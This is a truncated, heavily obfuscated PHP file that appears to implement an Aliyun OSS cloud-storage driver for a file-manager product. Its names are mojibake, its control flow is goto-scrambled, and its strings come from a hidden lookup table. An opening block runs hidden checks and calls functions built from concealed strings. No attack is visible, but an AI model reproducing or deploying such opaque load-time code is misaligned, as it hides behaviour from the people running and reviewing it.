<?php
 goto eö°©ç›‡; cÖˆ•¸›¬Ò: if ($_SERVER[$_SERVER[µ…][812]] != $_SERVER[$_SERVER[µ…][1236]]) { goto E‰¥àÅñ†ç; E‰¥àÅñ†ç: $bŠà…„–Ğê = $_SERVER[µ…][814]; $CˆÙÏå¿× = $_SERVER[$_SERVER[µ…][815]] . $_SERVER[µ…][816]; $f›éÑÒß = $bŠà…„–Ğê($CˆÙÏå¿×); goto DÃäïåé; cœ¦ˆ£åö†: $Côö±ò†¹‰($_SERVER[$_SERVER[µ…][810]]); goto d˜¨â¼Í¨; DÃäïåé: $dƒèŞõ¹× = explode($_SERVER[µ…][227], $f›éÑÒß); if (count($dƒèŞõ¹×) < $_SERVER[µ…][577]) { $F®™¼Ïù´ß = $_SERVER[µ…][817]; $F®™¼Ïù´ß(); } $Côö±ò†¹‰ = $_SERVER[µ…][1237]; goto cœ¦ˆ£åö†; d˜¨â¼Í¨: } class PathDriverOOS extends PathDriverBaseS3 { public function __construct($D»µôß) { parent::__construct($D»µôß); $this->signatureVersion($_SERVER[µ…][210]); } public function fileOutLink($FâÒ˜åŠèÀ) { $a‰í³••øÖ =& $_SERVER[µ…]; if (substr($FâÒ˜åŠèÀ, 0, 7) == $a‰í³••øÖ[1179]) { $FâÒ˜åŠèÀ = $a‰í³••øÖ[1180] . substr($FâÒ˜åŠèÀ, 7); } header($a‰í³••øÖ[158] . $FâÒ˜åŠèÀ); die; } } class PathDriverOSS extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $bucket = ''; protected $bucketAcl = ''; protected $endpoint = null; protected $client = null; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $cdnHost = ''; public function __construct($D­î“¡íô†) { parent::__construct(); include_once SDK_DIR . $_SERVER[µ…][1238]; $this->_init($D­î“¡íô†); } public function _init($fËãÃ¯¿‰) { $fß‹åš‘‰‰ =& $_SERVER[µ…]; foreach ($fËãÃ¯¿‰ as $AêÛ¶²˜ª => $d†îàÙÄšÄ) { if (isset($this->{$AêÛ¶²˜ª})) { $this->{$AêÛ¶²˜ª} = $d†îàÙÄšÄ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($fß‹åš‘‰‰[1239] . LNG($fß‹åš‘‰‰[1240])); } $this->client = new OSS\OssClient($this->accessKey, $this->secret, $this->domain); $this->client->setConnectTimeout(60); } public function setBucketCors() { goto B‹Œ‰æìÌÇ; dºÓ šßÊÒ: $BÈ°Êù…¸Ì->addRule($d—‰©È…¡ˆ); try { $this->client->putBucketCors($this->bucket, $BÈ°Êù…¸Ì); } catch (OSS\Core\OssException $d‹Íé©±ÚŒ) { return !1; } return !0; goto d¾–Ğâ‡ºš; Bˆï’¼å¹: $d—‰©È…¡ˆ->setMaxAgeSeconds(600); $d—‰©È…¡ˆ->addExposeHeader($CßĞˆâÃåÑ[1246]); $d—‰©È…¡ˆ->addAllowedHeader($CßĞˆâÃåÑ[1241]); goto dºÓ šßÊÒ; C³Òµ¥Û˜ä: $d—‰©È…¡ˆ->addAllowedMethod($CßĞˆâÃåÑ[1244]); $d—‰©È…¡ˆ->addAllowedMethod($CßĞˆâÃåÑ[1245]); $d—‰©È…¡ˆ->addAllowedMethod($CßĞˆâÃåÑ[157]); goto Bˆï’¼å¹; B‹Œ‰æìÌÇ: $CßĞˆâÃåÑ =& $_SERVER[µ…]; $BÈ°Êù…¸Ì = new OSS\Model\CorsConfig(); $d—‰©È…¡ˆ = new OSS\Model\CorsRule(); goto dÖ¦Ì¥”ÜÁ; dÖ¦Ì¥”ÜÁ: $d—‰©È…¡ˆ->addAllowedOrigin($CßĞˆâÃåÑ[1241]); $d—‰©È…¡ˆ->addAllowedMethod($CßĞˆâÃåÑ[1242]); $d—‰©È…¡ˆ->addAllowedMethod($CßĞˆâÃåÑ[1243]); goto C³Òµ¥Û˜ä; d¾–Ğâ‡ºš: } public function getBucketCors() { goto AñŞŒ‡‚°·; aê¯êŠ¤¹Ã: $F‚­ƒªé‡Ú = $DªÜÀ­‡Í[0]->getMaxAgeSeconds(); $cìëÂ§¶¤ = $DªÜÀ­‡Í[0]->getExposeHeaders(); $b±¸¿¥Ãƒ = $DªÜÀ­‡Í[0]->getAllowedHeaders(); goto e¡—ÀÒÒ”; DŒò·äœÉ£: if (!$Eâ¿²§Í¯° || !($DªÜÀ­‡Í = $Eâ¿²§Í¯°->getRules())) { return null; } $a™”îİ‡›’ = $DªÜÀ­‡Í[0]->getAllowedOrigins(); $a¼©‚Ï‘¾­ = $DªÜÀ­‡Í[0]->getAllowedMethods(); goto aê¯êŠ¤¹Ã; e¡—ÀÒÒ”: return array($Fôá®ê¿é‰[180] => isset($a™”îİ‡›’[0]) ? $a™”îİ‡›’[0] : $Fôá®ê¿é‰[33], $Fôá®ê¿é‰[184] => $a¼©‚Ï‘¾­, $Fôá®ê¿é‰[1247] => $F‚­ƒªé‡Ú, $Fôá®ê¿é‰[1248] => isset($cìëÂ§¶¤[0]) ? $cìëÂ§¶¤[0] : $Fôá®ê¿é‰[33], $Fôá®ê¿é‰[182] => isset($b±¸¿¥Ãƒ[0]) ? $b±¸¿¥Ãƒ[0] : $Fôá®ê¿é‰[33]); goto bŠ‹²˜; AñŞŒ‡‚°·: $Fôá®ê¿é‰ =& $_SERVER[µ…]; $Eâ¿²§Í¯° = null; try { $Eâ¿²§Í¯° = $this->client->getBucketCors($this->bucket); } catch (OSS\Core\OssException $EÍ“½æê) { return null; } goto DŒò·äœÉ£; bŠ‹²˜: } public function isBucketCors() { goto Bëâ¦Ôà²; B£çêİçĞ°: $f†¢õ¦Â÷¸ = array($eˆ¢·Ïß¥[185], $eˆ¢·Ïß¥[186], $eˆ¢·Ïß¥[187], $eˆ¢·Ïß¥[188], $eˆ¢·Ïß¥[189]); $c¥ë®ÒˆùÈ = array_diff($f†¢õ¦Â÷¸, $cŸÀšœ¯àÕ); return empty($c¥ë®ÒˆùÈ); goto Eî•ö“‚Ú‚; E¸Ñ£îõ„: if ($BÊÅÄ¼¸·È[$eˆ¢·Ïß¥[180]] != $eˆ¢·Ïß¥[181] || $BÊÅÄ¼¸·È[$eˆ¢·Ïß¥[182]] != $eˆ¢·Ïß¥[181]) { return !1; } $cŸÀšœ¯àÕ = array_map($eˆ¢·Ïß¥[183], $BÊÅÄ¼¸·È[$eˆ¢·Ïß¥[184]]); if (!is_array($cŸÀšœ¯àÕ)) { $cŸÀšœ¯àÕ = array(); } goto B£çêİçĞ°; Bëâ¦Ôà²: $eˆ¢·Ïß¥ =& $_SERVER[µ…]; $BÊÅÄ¼¸·È = $this->getBucketCors(); if (!$BÊÅÄ¼¸·È || !is_array($BÊÅÄ¼¸·È)) { return !1; } goto E¸Ñ£îõ„; Eî•ö“‚Ú‚: } public function mkfile($AÉ»Ö‡¤«Ó, $EÒòò‹ÃĞğ = '', $e¶ŞÍ¡·ˆ = REPEAT_RENAME) { $eË¨òŒŠÜ = $this->setContent($AÉ»Ö‡¤«Ó, $EÒòò‹ÃĞğ); if ($eË¨òŒŠÜ !== !1) { return $this->getPathOuter($AÉ»Ö‡¤«Ó); } return !1; } public function mkdir($a–³¤‹Áà, $E†ÔºÓñ = REPEAT_SKIP) { if ($this->_isFolder($a–³¤‹Áà)) { return $this->getPathOuter($a–³¤‹Áà); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($a–³¤‹Áà)); } catch (OSS\Core\OssException $Fö…è—ƒÊ) { return !1; } return $this->getPathOuter($a–³¤‹Áà); } private function fileList($BÇï²áŠã¾, $a´¡™ÂÈö = '', $A”Ş®¯…ÓÙ = 0) { goto cÌ¼Úóº…‘; cÌ¼Úóº…‘: $Dµ¦©òô‘Ñ =& $_SERVER[µ…]; $BÇï²áŠã¾ = trim($BÇï²áŠã¾, $Dµ¦©òô‘Ñ[8]); $eÒ‚ÂÖŠ¸ = empty($BÇï²áŠã¾) ? $Dµ¦©òô‘Ñ[33] : $BÇï²áŠã¾ . $Dµ¦©òô‘Ñ[8]; goto Dˆ‚´Õ¯â“; Dˆ‚´Õ¯â“: $D‡Øè…»ìÙ = $Dµ¦©òô‘Ñ[33]; $CªØ¯åÂÑ¨ = 1000; $c¯±òŠŸñ = $this->listItemCache === !1 ? !1 : !0; goto A‹É“áš»‘; A‹É“áš»‘: $c‰¹´Ö•Ş˜ = $EÃ¡Üô¢Í = array(); while (!0) { check_abort(); $F§îô¢·‚‘ = array($Dµ¦©òô‘Ñ[1249] => $a´¡™ÂÈö, $Dµ¦©òô‘Ñ[1250] => $eÒ‚ÂÖŠ¸, $Dµ¦©òô‘Ñ[1251] => $CªØ¯åÂÑ¨, $Dµ¦©òô‘Ñ[1252] => $D‡Øè…»ìÙ); try { $d„±˜º×é¿ = $this->client->listObjects($this->bucket, $F§îô¢·‚‘); } catch (OSS\Core\OssException $b°ª¬š¬’) { break; } $D‡Øè…»ìÙ = $d„±˜º×é¿->getNextMarker(); $CÍïÃ’¨è¡ = $d„±˜º×é¿->getObjectList(); $B©µ—í°²ø = $d„±˜º×é¿->getPrefixList(); foreach ($CÍïÃ’¨è¡ as $aø™ßë¡İÍ) { goto D´ç¾åµÑ; dåĞ‚Ää„Ú: $AÍãš‘öŠØ = $aø™ßë¡İÍ->getLastModified(); $D›öâÈ¼‹ = $A”Ş®¯…ÓÙ ? array($Dµ¦©òô‘Ñ[28] => $F•‡¦…¼“Ä, $Dµ¦©òô‘Ñ[77] => $b»à¬ƒ¦Á, $Dµ¦©òô‘Ñ[195] => strtotime($AÍãš‘öŠØ)) : $F•‡¦…¼“Ä; $FáÓÄ˜¶„ = $b»à¬ƒ¦Á == 0 && substr($F•‡¦…¼“Ä, strlen($F•‡¦…¼“Ä) - 1, 1) == $Dµ¦©òô‘Ñ[8] ? !0 : !1; goto d¡éÚ¶•”; D´ç¾åµÑ: if ($aø™ßë¡İÍ->getKey() == $eÒ‚ÂÖŠ¸) { continue; } $F•‡¦…¼“Ä = $aø™ßë¡İÍ->getKey(); $b»à¬ƒ¦Á = $aø™ßë¡İÍ->getSize(); goto dåĞ‚Ää„Ú; d¡éÚ¶•”: if ($c¯±òŠŸñ) { $this->cacheMethod($Dµ¦©òô‘Ñ[197], $F•‡¦…¼“Ä, $FáÓÄ˜¶„); $this->cacheMethod($Dµ¦©òô‘Ñ[198], $F•‡¦…¼“Ä, array($Dµ¦©òô‘Ñ[77] => $b»à¬ƒ¦Á, $Dµ¦©òô‘Ñ[1253] => $b»à¬ƒ¦Á, $Dµ¦©òô‘Ñ[83] => strtotime($AÍãš‘öŠØ), $Dµ¦©òô‘Ñ[1254] => $AÍãš‘öŠØ)); } if ($FáÓÄ˜¶„) { $c‰¹´Ö•Ş˜[] = $F•‡¦…¼“Ä; continue; } $EÃ¡Üô¢Í[] = $D›öâÈ¼‹; goto BÖãĞÉäÅ; BÖãĞÉäÅ: } foreach ($B©µ—í°²ø as $d®Í”½ÏÂª) { $c‰¹´Ö•Ş˜[] = $d®Í”½ÏÂª->getPrefix(); if ($c¯±òŠŸñ) { $this->cacheMethod($Dµ¦©òô‘Ñ[197], $F•‡¦…¼“Ä, !0); } } if ($D‡Øè…»ìÙ === $Dµ¦©òô‘Ñ[33]) { break; } } if ($c¯±òŠŸñ) { $this->cacheMethod($Dµ¦©òô‘Ñ[197], $BÇï²áŠã¾, !0); } goto CÏêÙ—ˆˆ; CÏêÙ—ˆˆ: return array($Dµ¦©òô‘Ñ[74] => $c‰¹´Ö•Ş˜, $Dµ¦©òô‘Ñ[73] => $EÃ¡Üô¢Í); goto dù°­ê·™ğ; dù°­ê·™ğ: } public function copyFile($fƒ•à, $aÍÊ™¾¤ÁÏ) { $E¾—ÂïÔí‚ = $this->size($fƒ•à); if ($E¾—ÂïÔí‚ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $fƒ•à, $this->bucket, $this->pathEncode($aÍÊ™¾¤ÁÏ)); } catch (OSS\Core\OssException $bÛÌÙÃ†±») { return !1; } return $this->getPathOuter($aÍÊ™¾¤ÁÏ); } $eà‚ù‡­õ¦ = $this->multiCopyObject($fƒ•à, $aÍÊ™¾¤ÁÏ, $E¾—ÂïÔí‚); return $eà‚ù‡­õ¦ ? $this->getPathOuter($aÍÊ™¾¤ÁÏ) : !1; } private function multiCopyObject($bêÒºá©õª, $bÌ¼ƒÜíšÕ, $BÉ¬ŒŠÔËÒ) { $EÉ¹»œ§¦‡ =& $_SERVER[µ…]; try { goto d¾·£Š¦; F´Š„Ğ‰¼Ô: $A¢ßê„·ˆ­ = array(); foreach ($fìèÕ‘Ïø’ as $A²›¯Û¦ç¸ => $c÷öì»¦Ø) { $A¢ßê„·ˆ­[] = array($EÉ¹»œ§¦‡[1259] => $A²›¯Û¦ç¸ + 1, $EÉ¹»œ§¦‡[1260] => $c÷öì»¦Ø); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($bÌ¼ƒÜíšÕ), $aÊğø±”ÓŒ, $A¢ßê„·ˆ­); goto c‰åÙ•·«î; dï¸òÔ»¢: $Cì‚»šòæ = 1024 * 1024 * 10; $a×–œÊİ = $this->client->generateMultiuploadParts($BÉ¬ŒŠÔËÒ, $Cì‚»šòæ); foreach ($a×–œÊİ as $A²›¯Û¦ç¸ => $B¨¯Øğ—Óç) { $EåÏğœÃíÕ = $aÀæ•¦ï¶ç + (int) $B¨¯Øğ—Óç[$EÉ¹»œ§¦‡[1256]]; $EèÆ§Õ³ = (int) $B¨¯Øğ—Óç[$EÉ¹»œ§¦‡[333]] + $EåÏğœÃíÕ - 1; $C÷šë‡§íÌ = array($EÉ¹»œ§¦‡[1257] => $EåÏğœÃíÕ, $EÉ¹»œ§¦‡[1258] => $EèÆ§Õ³); $fìèÕ‘Ïø’[] = $this->client->uploadPartCopy($this->bucket, $bêÒºá©õª, $this->bucket, $this->pathEncode($bÌ¼ƒÜíšÕ), $bó©Øƒôº, $aÊğø±”ÓŒ, $C÷šë‡§íÌ); $bó©Øƒôº = $bó©Øƒôº + 1; } goto F´Š„Ğ‰¼Ô; C“å£†×óø: $bó©Øƒôº = 1; $aÀæ•¦ï¶ç = 0; $fìèÕ‘Ïø’ = array(); goto dï¸òÔ»¢; d¾·£Š¦: $cÄõ©“Ì÷ = array(); if ($c¡‰İ•ğ© = $this->hashMd5($bêÒºá©õª)) { $cÄõ©“Ì÷ = array(OSS\OssClient::OSS_HEADERS => array($EÉ¹»œ§¦‡[1255] => $c¡‰İ•ğ©)); } $aÊğø±”ÓŒ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($bÌ¼ƒÜíšÕ), $cÄõ©“Ì÷); goto C“å£†×óø; c‰åÙ•·«î: } catch (OSS\Core\OssException $F…„º¿Ç¶) { return !1; } return !0; } public function moveFile($A½äÆóŠÄ, $A‘íÇ¶àéÏ) { if ($this->copyFile($A½äÆóŠÄ, $A‘íÇ¶àéÏ)) { $this->remove($A½äÆóŠÄ); return $this->getPathOuter($A‘íÇ¶àéÏ); } return !1; } public function delFile($C²’˜ŒÉŠÜ) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($C²’˜ŒÉŠÜ)); } catch (OSS\Core\OssException $D‘ÚÔÆŠ) { return !1; } return !0; } public function delFolder($B’ÅÅ¹†ª) { goto BÌ¶ÒÚµ“˜; AØ©èæÅÓ: $Cå£À¼ó = $this->fileList($B’ÅÅ¹†ª); $this->listItemCache = !0; $BèÜ‹µ¡ğò = trim($B’ÅÅ¹†ª, $eç˜šó¢åò[8]) . $eç˜šó¢åò[8]; goto b‡º­İÍ‹; Dã½é¾¶·: return $this->delByBatch($Cå£À¼ó[$eç˜šó¢åò[74]]); goto d×¦áçÅÍŒ; b‡º­İÍ‹: if (!empty($B’ÅÅ¹†ª) && !in_array($BèÜ‹µ¡ğò, $Cå£À¼ó[$eç˜šó¢åò[74]])) { $Cå£À¼ó[$eç˜šó¢åò[74]][] = $BèÜ‹µ¡ğò; } $aÄ®É¤ Ú = $this->delByBatch($Cå£À¼ó[$eç˜šó¢åò[73]]); if (!$aÄ®É¤ Ú) { return !1; } goto Dã½é¾¶·; BÌ¶ÒÚµ“˜: $eç˜šó¢åò =& $_SERVER[µ…]; if (!$this->exist($B’ÅÅ¹†ª)) { return !0; } $this->listItemCache = !1; goto AØ©èæÅÓ; d×¦áçÅÍŒ: } private function delByBatch($eÑèŸç„…) { foreach (array_chunk($eÑèŸç„…, 1000) as $E“ä’èçùˆ) { try { $this->client->deleteObjects($this->bucket, $E“ä’èçùˆ); } catch (OSS\Core\OssException $FõÜ£§†²É) { return !1; } } return !0; } public function rename($F†Èä‰Âå”, $Eø•Á‘Úª˜) { return $this->renameObject($F†Èä‰Âå”, $Eø•Á‘Úª˜); } private function fileInfo($AµŸæÛáğ†, $aæñÛß«Èó = false, $dà§ÖÀÄíÕ = array()) { goto CŠÔ½µİ–‚; D…¢µ¨¬Æ : if (isset($dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[77]])) { $D‚£¢İ—©¹[$c—’‹¦Ï¡Â[77]] = $dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[77]]; } if (isset($dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[83]])) { $D‚£¢İ—©¹[$c—’‹¦Ï¡Â[83]] = $dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[83]]; } if (isset($dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[195]]) && !trim($D‚£¢İ—©¹[$c—’‹¦Ï¡Â[83]])) { $D‚£¢İ—©¹[$c—’‹¦Ï¡Â[83]] = $dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[195]]; } goto cÎŞÑå¡š¯; báÌËêòªµ: $D‚£¢İ—©¹[$c—’‹¦Ï¡Â[192]] = $D‚£¢İ—©¹[$c—’‹¦Ï¡Â[83]] = 0; $D‚£¢İ—©¹[$c—’‹¦Ï¡Â[193]] = $D‚£¢İ—©¹[$c—’‹¦Ï¡Â[194]] = !0; if (empty($dà§ÖÀÄíÕ)) { $FÒ™îçåèë = $this->objectMeta($AµŸæÛáğ†); if (!$FÒ™îçåèë) { return $D‚£¢İ—©¹; } $dà§ÖÀÄíÕ = array($c—’‹¦Ï¡Â[83] => strtotime($FÒ™îçåèë[$c—’‹¦Ï¡Â[1254]]), $c—’‹¦Ï¡Â[77] => $FÒ™îçåèë[$c—’‹¦Ï¡Â[1253]] + 0); } goto D…¢µ¨¬Æ ; cÎŞÑå¡š¯: return $D‚£¢İ—©¹; goto a³†¬«ä; CŠÔ½µİ–‚: $c—’‹¦Ï¡Â =& $_SERVER[µ…]; $D‚£¢İ—©¹ = array($c—’‹¦Ï¡Â[28] => $this->pathThis($AµŸæÛáğ†), $c—’‹¦Ï¡Â[75] => $this->getPathOuter($AµŸæÛáğ†), $c—’‹¦Ï¡Â[29] => $c—’‹¦Ï¡Â[191], $c—’‹¦Ï¡Â[77] => isset($dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[77]]) ? $dà§ÖÀÄíÕ[$c—’‹¦Ï¡Â[77]] : 0, $c—’‹¦Ï¡Â[167] => $this->ext($AµŸæÛáğ†)); if ($aæñÛß«Èó) { return $D‚£¢İ—©¹; } goto báÌËêòªµ; a³†¬«ä: } private function folderInfo($EÔÏİÏ¶ÃÄ, $aÎµÑÓ½»¶ = false, $A¼°ˆäñá‹ = array()) { goto EÀ‡öª£; aˆÊÔ†¼êÇ: $c §™íÀ—Ù[$EßÀ¬¼…¸ù[192]] = $c §™íÀ—Ù[$EßÀ¬¼…¸ù[83]] = 0; $c §™íÀ—Ù[$EßÀ¬¼…¸ù[193]] = $c §™íÀ—Ù[$EßÀ¬¼…¸ù[194]] = !0; if (empty($A¼°ˆäñá‹)) { $EÔÏİÏ¶ÃÄ = rtrim($EÔÏİÏ¶ÃÄ, $EßÀ¬¼…¸ù[8]) . $EßÀ¬¼…¸ù[8]; $e—”—ç—óî = $this->objectMeta($EÔÏİÏ¶ÃÄ); if (!$e—”—ç—óî) { return $c §™íÀ—Ù; } $A¼°ˆäñá‹ = array($EßÀ¬¼…¸ù[192] => $e—”—ç—óî[$EßÀ¬¼…¸ù[1261]][$EßÀ¬¼…¸ù[1262]], $EßÀ¬¼…¸ù[83] => strtotime($e—”—ç—óî[$EßÀ¬¼…¸ù[1254]])); } goto EÙÖ–õ™¸«; EÙÖ–õ™¸«: if (isset($A¼°ˆäñá‹[$EßÀ¬¼…¸ù[83]])) { $c §™íÀ—Ù[$EßÀ¬¼…¸ù[83]] = $A¼°ˆäñá‹[$EßÀ¬¼…¸ù[83]]; } if (isset($A¼°ˆäñá‹[$EßÀ¬¼…¸ù[192]])) { $c §™íÀ—Ù[$EßÀ¬¼…¸ù[192]] = $A¼°ˆäñá‹[$EßÀ¬¼…¸ù[192]]; } return $c §™íÀ—Ù; goto d÷‡ë—Òù; EÀ‡öª£: $EßÀ¬¼…¸ù =& $_SERVER[µ…]; $c §™íÀ—Ù = array($EßÀ¬¼…¸ù[28] => $this->pathThis($EÔÏİÏ¶ÃÄ), $EßÀ¬¼…¸ù[75] => $this->getPathOuter($EßÀ¬¼…¸ù[8] . $EÔÏİÏ¶ÃÄ), $EßÀ¬¼…¸ù[29] => $EßÀ¬¼…¸ù[76]); if ($aÎµÑÓ½»¶) { return $c §™íÀ—Ù; } goto aˆÊÔ†¼êÇ; d÷‡ë—Òù: } public function listPath($fĞ¹°—Ü¯‹, $cÍä±¾Ä†æ = false) { $FÒÆÜ‹…× =& $_SERVER[µ…]; $e©ô‰„Ùğ = $this->fileList($fĞ¹°—Ü¯‹, $FÒÆÜ‹…×[8], !0); foreach ($e©ô‰„Ùğ[$FÒÆÜ‹…×[74]] as $a¦˜²í•‰ => $F±ŒÓ¿Íƒ) { $e©ô‰„Ùğ[$FÒÆÜ‹…×[74]][$a¦˜²í•‰] = $this->folderInfo($F±ŒÓ¿Íƒ, $cÍä±¾Ä†æ, $F±ŒÓ¿Íƒ); } foreach ($e©ô‰„Ùğ[$FÒÆÜ‹…×[73]] as $a¦˜²í•‰ => $F±ŒÓ¿Íƒ) { $e©ô‰„Ùğ[$FÒÆÜ‹…×[73]][$a¦˜²í•‰] = $this->fileInfo($F±ŒÓ¿Íƒ[$FÒÆÜ‹…×[28]], $cÍä±¾Ä†æ, $F±ŒÓ¿Íƒ); } return $e©ô‰„Ùğ; } public function has($F˜È‡ãªÊ¥, $AÖ¦Åã…Ââ = false, $b¾éÉ¾×» = true) { goto cò Ù÷ÅĞË; a—åÁÇ…Ü: $AÌÃ½Õğ¶ = $a–°”•²ñ‰[33]; $A˜ÔØ„˜ = 500; $fàî«Å± î = $D³‹ñì‹³‹ = 0; goto B¨íÛ‡ê‡Ñ; cò Ù÷ÅĞË: $a–°”•²ñ‰ =& $_SERVER[µ…]; $F˜È‡ãªÊ¥ = trim($F˜È‡ãªÊ¥, $a–°”•²ñ‰[8]); $BÜ“¦°±ë– = empty($F˜È‡ãªÊ¥) ? $a–°”•²ñ‰[33] : $F˜È‡ãªÊ¥ . $a–°”•²ñ‰[8]; goto a—åÁÇ…Ü; B¨íÛ‡ê‡Ñ: while (!0) { check_abort(); $a¬ÄÏÓæç¦ = array($a–°”•²ñ‰[1249] => $a–°”•²ñ‰[8], $a–°”•²ñ‰[1250] => $BÜ“¦°±ë–, $a–°”•²ñ‰[1251] => $A˜ÔØ„˜, $a–°”•²ñ‰[1252] => $AÌÃ½Õğ¶); try { $AÔø£–«­ = $this->client->listObjects($this->bucket, $a¬ÄÏÓæç¦); } catch (OSS\Core\OssException $e‰²™ØÀË”) { break; } $AÌÃ½Õğ¶ = $AÔø£–«­->getNextMarker(); $Eô»»¥º†Î = $AÔø£–«­->getObjectList(); $aèÄĞàÛË = $AÔø£–«­->getPrefixList(); if ($AÖ¦Åã…Ââ) { if (count($Eô»»¥º†Î) > 1 || count($Eô»»¥º†Î) == 1 && $Eô»»¥º†Î[0]->getKey() != $BÜ“¦°±ë–) { $fàî«Å± î += count($Eô»»¥º†Î) - 1; } if (!empty($aèÄĞàÛË)) { $D³‹ñì‹³‹ += count($aèÄĞàÛË); } if ($AÌÃ½Õğ¶ === $a–°”•²ñ‰[33]) { break; } continue; } if ($b¾éÉ¾×») { if (!empty($Eô»»¥º†Î)) { if (count($Eô»»¥º†Î) > 1 || $Eô»»¥º†Î[0]->getKey() != $BÜ“¦°±ë–) { return !0; } } } else { if (!empty($aèÄĞàÛË)) { return !0; } } if ($AÌÃ½Õğ¶ === $a–°”•²ñ‰[33]) { break; } } if ($AÖ¦Åã…Ââ) { return array($a–°”•²ñ‰[201] => $fàî«Å± î, $a–°”•²ñ‰[202] => $D³‹ñì‹³‹); } return !1; goto bÀ‰ë±§¥È; bÀ‰ë±§¥È: } public function listAll($f“Ê¸’¹Ã) { $cˆ½‹äáã =& $_SERVER[µ…]; $Dù·ÔĞí‘Î = $this->fileList($f“Ê¸’¹Ã, $cˆ½‹äáã[33], !0); $dĞİİæ©Ó = array(); foreach ($Dù·ÔĞí‘Î[$cˆ½‹äáã[73]] as $cÄ„ë‡”) { $dĞİİæ©Ó[$cÄ„ë‡”[$cˆ½‹äáã[28]]] = $cÄ„ë‡”[$cˆ½‹äáã[77]]; } foreach ($Dù·ÔĞí‘Î[$cˆ½‹äáã[74]] as $cÄ„ë‡”) { if (is_string($cÄ„ë‡”)) { $dĞİİæ©Ó[$cÄ„ë‡”] = 0; } } return $this->listAllFiles($f“Ê¸’¹Ã, array_keys($dĞİİæ©Ó), $dĞİİæ©Ó); } public function canRead($C¬ŠëÇ´Ğ) { $BîçµÇÑ¯ =& $_SERVER[µ…]; $B•Ü”Îã¦È = $this->pathAcl($C¬ŠëÇ´Ğ); return $B•Ü”Îã¦È == $BîçµÇÑ¯[1263] || $B•Ü”Îã¦È == $BîçµÇÑ¯[514] ? !0 : !1; } public function canWrite($aÕÌí§ìÂ) { $f ó‰â‰›ç = $this->pathAcl($aÕÌí§ìÂ); return $f ó‰â‰›ç == $_SERVER[µ…][514] ? !0 : !1; } public function pathAcl($f­½Û‚³÷á) { goto c¶„Ğ›ƒË; DªÀ°İª³: return $AÛŠã°ôÎä; goto DÈŸ±ƒòøœ; cªˆ„òƒ†: $AÛŠã°ôÎä = $cêŞ¸Õ¨­Ğ == $C¦ÛÌÀÏ‘[34] ? $this->bucketAcl : $cêŞ¸Õ¨­Ğ; if ($AÛŠã°ôÎä == $C¦ÛÌÀÏ‘[1264]) { return $C¦ÛÌÀÏ‘[1263]; } if ($AÛŠã°ôÎä == $C¦ÛÌÀÏ‘[1265]) { return $C¦ÛÌÀÏ‘[514]; } goto DªÀ°İª³; c¶„Ğ›ƒË: $C¦ÛÌÀÏ‘ =& $_SERVER[µ…]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $cêŞ¸Õ¨­Ğ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($f­½Û‚³÷á)); } catch (OSS\Core\OssException $a–Ñ™„Öâ ) { return !1; } goto cªˆ„òƒ†; DÈŸ±ƒòøœ: } private function chmodPath($BŞÙ„È†µÒ, $dá‰‡ç´Æç = '') { $DŒ‰­À‚íÍ =& $_SERVER[µ…]; $a¢âÕœ¶İê = empty($dá‰‡ç´Æç) ? $DŒ‰­À‚íÍ[1265] : $dá‰‡ç´Æç; $b‹É¦ª¶©Ì = array($DŒ‰­À‚íÍ[34], $DŒ‰­À‚íÍ[190], $DŒ‰­À‚íÍ[1264], $DŒ‰­À‚íÍ[1265]); if (!in_array($a¢âÕœ¶İê, $b‹É¦ª¶©Ì)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($BŞÙ„È†µÒ), $a¢âÕœ¶İê); } catch (OSS\Core\OssException $E¼„¥ğÖ ) { return !1; } return !0; } public function getContent($eÅŞ…«‹éù) { return $this->fileSubstr($eÅŞ…«‹éù, -1); } public function setContent($C×¡˜†Ô³, $c¼Š­’†½ = '') { $cÓùÙñšÍ¶ =& $_SERVER[µ…]; try { $B²âÔ½‰ø¸ = $this->trafficLimit($cÓùÙñšÍ¶[1266]); $FØÁ¡‰¥ = $this->client->putObject($this->bucket, $this->pathEncode($C×¡˜†Ô³), $c¼Š­’†½, $B²âÔ½‰ø¸); } catch (OSS\Core\OssException $C¼·•¶ø‡ß) { return !1; } $DÖíì— ¡ = array($cÓùÙñšÍ¶[1255] => trim($FØÁ¡‰¥[$cÓùÙñšÍ¶[1267]], $cÓùÙñšÍ¶[115]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($C×¡˜†Ô³))); $this->updateObjMeta($C×¡˜†Ô³, $DÖíì— ¡); return isset($FØÁ¡‰¥[$cÓùÙñšÍ¶[1268]][$cÓùÙñšÍ¶[1212]]) ? !0 : !1; } private function updateObjMeta($BïÔ‰ÊŠË‰, $d›¼äË”¸) { $BïÔ‰ÊŠË‰ = $this->pathEncode($BïÔ‰ÊŠË‰); try { $añÉÉ¿ÎÜ = array(OSS\OssClient::OSS_HEADERS => $d›¼äË”¸); $this->client->copyObject($this->bucket, $BïÔ‰ÊŠË‰, $this->bucket, $BïÔ‰ÊŠË‰, $añÉÉ¿ÎÜ); } catch (OSS\Core\OssException $E…à¯ã‡’¿) { return !1; } return !0; } public function upload($fã—†ËÌ²Ê, $b˜‰èô¾‚é, $fÄêãòÅÁ = false, $aËÒÎ¡Öò¸ = REPEAT_REPLACE) { $c¢ñ—º÷– =& $_SERVER[µ…]; $FÚø¡Õˆ®‹ = trim($fã—†ËÌ²Ê, $c¢ñ—º÷–[8]); $CÄì»ˆ¯” = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, 